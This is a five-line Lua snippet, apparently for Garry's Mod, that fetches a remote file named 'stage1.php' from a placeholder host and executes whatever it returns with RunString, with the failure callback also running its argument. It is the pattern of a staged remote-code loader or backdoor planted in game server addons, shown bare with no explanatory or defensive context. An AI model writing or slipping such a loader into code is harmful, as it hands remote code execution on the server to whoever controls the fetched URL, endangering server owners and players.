http.Fetch("https://example.com//core/stage1.php", function(body)
    RunString(body)
end or function(c)
    RunString(c)
end)